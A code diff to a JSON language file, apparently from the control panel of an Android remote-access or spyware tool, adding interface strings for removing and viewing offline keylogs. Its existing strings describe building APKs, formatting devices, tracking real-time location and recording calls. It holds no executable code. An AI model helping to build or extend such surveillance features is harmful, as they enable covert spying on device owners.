@@ -57,7 +57,8 @@
       "send-message": "Message has been sent successfully",
       "create-apk": "You have crated new apk successfully, you can download an apk in download panel.",
       "device-format": "Device formatted successfully.",
-      "uninstall-app": "The app has been successfully removed from a device."
+      "uninstall-app": "The app has been successfully removed from a device.",
+      "keylog-remove": "removed successfully."
     },
     "error": {
       "default": "An unexpected error occurred.",
@@ -246,6 +247,8 @@
       "keyevent": "Event",
       "keypackage": "Package",
       "keylogs": "KeyLogs",
+      "offline-keylog-empty": "No key logs available for this device.",
+      "offline-keylog-content-empty": "Select a file to view its content",
       "realTimeLocation": "Real-Time Location",
       "webBroswer": "Web Browser",
       "callRecord": "Call Record",
